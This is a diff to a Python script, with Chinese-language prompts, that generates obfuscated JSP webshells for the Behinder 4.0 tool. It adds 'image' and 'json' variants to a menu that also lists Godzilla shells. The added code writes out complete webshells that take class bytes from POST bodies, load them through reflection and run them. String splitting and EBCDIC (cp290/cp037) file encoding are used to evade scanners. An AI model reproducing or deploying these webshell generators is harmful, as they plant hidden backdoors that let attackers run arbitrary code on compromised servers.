@@ -3,6 +3,36 @@ import os
 import time
 import ebcdic
 
+def bin_40_json():
+    name = input("文件名为：\n")
+    if not name.endswith(".jsp"):
+        name += ".jsp"
+    if os.path.exists(name):
+        exit("文件已存在")
+    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
+    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data) throws Exception{ByteArrayOutputStream bos=new ByteArrayOutputStream();y.sayHello(ByteArrayOutputStream.class,"write",new Class[]{byte[].class,int.class,int.class},bos,new Object[]{data,26, data.length-29});String s = new String((byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{}));s = (String)y.sayHello(String.class,"repl"+"ace",new Class[]{char.class,char.class},s,new Object[]{'&lt;','+'});s = (String)y.sayHello(String.class,"repl"+"ace",new Class[]{char.class,char.class},s,new Object[]{'&gt;','/'});Object dc = y.sayHello(Base64.class, "getDec"+"oder", new Class[]{}, null, new Object[]{});return (byte[])y.sayHello(Base64.Decoder.class, "dec"+"ode", new Class[]{String.class}, dc, new Object[]{s});}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b)),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
+    f = open(name, "wb")
+    path = os.path.abspath(name)
+    f.write(context1.encode("cp037"))
+    f.write(context2.encode("cp290"))
+    f.close()
+    print("生成成功！！！  " + path)
+
+def bin_40_image():
+    name = input("文件名为：\n")
+    if not name.endswith(".jsp"):
+        name += ".jsp"
+    if os.path.exists(name):
+        exit("文件已存在")
+    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
+    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data) throws Exception{ByteArrayOutputStream bos=new ByteArrayOutputStream();y.sayHello(ByteArrayOutputStream.class,"wri"+"te",new Class[]{byte[].class,int.class,int.class},bos,new Object[]{data,966, data.length-966});return (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b)),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
+    f = open(name, "wb")
+    path = os.path.abspath(name)
+    f.write(context1.encode("cp037"))
+    f.write(context2.encode("cp290"))
+    f.close()
+    print("生成成功！！！  " + path)
+
 def bin_40_aes():
     name = input("文件名为：\n")
     if not name.endswith(".jsp"):
@@ -108,7 +138,7 @@ def raw():
 
 
 if __name__ == '__main__':
-    tp = input("请输入对应的类型（数字）：1.Godzilla_JAVA_AES_BASE664  2.Godzilla_JAVA_AES_RAW  3.Behinder3.0_SHELL  4.Behinder4.0_xor  5.Behinder4.0_xor_base64  6.Behinder4.0_aes\n")
+    tp = input("请输入对应的类型（数字）：1.Godzilla_JAVA_AES_BASE664  2.Godzilla_JAVA_AES_RAW  3.Behinder3.0_SHELL  4.Behinder4.0_xor  5.Behinder4.0_xor_base64  6.Behinder4.0_aes  7.Behinder4.0_image  8.Behinder4.0_json\n")
     if tp == "1":
         base()
     elif tp == "2":
@@ -121,6 +151,10 @@ if __name__ == '__main__':
         bin_40_xor_base64()
     elif tp == "6":
         bin_40_aes()
+    elif tp == "7":
+        bin_40_image()
+    elif tp == "8":
+        bin_40_json()
     else:
         print("??????")
     time.sleep(10)
